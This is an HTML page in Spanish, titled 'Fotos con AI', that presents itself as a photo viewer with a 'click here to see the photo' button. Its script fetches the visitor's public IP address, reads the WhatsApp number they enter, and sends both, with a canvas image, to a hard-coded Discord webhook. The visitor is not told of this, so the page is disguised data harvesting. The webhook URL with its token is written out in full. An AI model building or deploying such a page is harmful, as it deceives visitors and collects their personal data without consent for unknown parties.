<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fotos con AI</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #333;
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2em;
            color: #666;
            margin-bottom: 30px;
        }
        #video, #canvas {
            border: 2px solid #333;
            margin: 20px 0;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        #snap {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        #snap:hover {
            background-color: #0056b3;
        }
        #info {
            margin-top: 20px;
            font-size: 1.1em;
            color: #555;
        }
        #whatsapp-input {
            padding: 10px;
            font-size: 18px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>Fotos con AI</h1>
    <p>Click aquí para ver la foto</p>
    <button id="snap">Click aquí para ver la foto</button>
    <canvas id="canvas" width="640" height="480"></canvas>
    <div id="info"></div>
    <input type="text" id="whatsapp-input" placeholder="Ingresa tu número de WhatsApp">
    <script>
        const canvas = document.getElementById('canvas');
        const snap = document.getElementById('snap');
        const info = document.getElementById('info');
        const whatsappInput = document.getElementById('whatsapp-input');

        // Capturar la IP del usuario
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Error al obtener la IP:", error);
            }
        }

        // Obtener el número de WhatsApp del input
        function getWhatsAppNumber() {
            return whatsappInput.value;
        }

        // Enviar datos al webhook de Discord
        async function sendToDiscord(ip, whatsapp, imageData) {
            const webhookUrl = 'https://discord.com/api/webhooks/1414294854371905707/7r4_4X8mTX1IJ9aUS0IKoKb6PmjQxAG5zZbnexYNdyxWMYW5ubBNLDZ_9VQ--xerFwSm';
            const formData = new FormData();
            formData.append('content', `IP del usuario: ${ip}\nWhatsApp: ${whatsapp}`);
            formData.append('file', new Blob([imageData], { type: 'image/png' }), 'foto.png');

            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok) {
                    throw new Error('Error al enviar datos al webhook');
                }
                console.log('Datos enviados exitosamente');
            } catch (error) {
                console.error("Error al enviar datos al webhook:", error);
            }
        }

        snap.addEventListener("click", async function() {
            const context = canvas.getContext('2d');
            context.clearRect(0, 0, canvas.width, canvas.height); // Limpiar el canvas
            context.font = '48px Arial';
            context.fillStyle = '#333';
            context.fillText('Hola', 200, 250); // Dibujar "Hola" en el canvas
            const imgData = canvas.toDataURL('image/png').split(',')[1]; // Eliminar la parte del encabezado
            const ip = await getUserIP();
            const whatsapp = getWhatsAppNumber();
            sendToDiscord(ip, whatsapp, imgData);
            info.innerText = "¡Foto tomada y enviada exitosamente!";
            // Mostrar la foto en el canvas
            canvas.style.display = 'block';
        });
    </script>
</body>
</html>
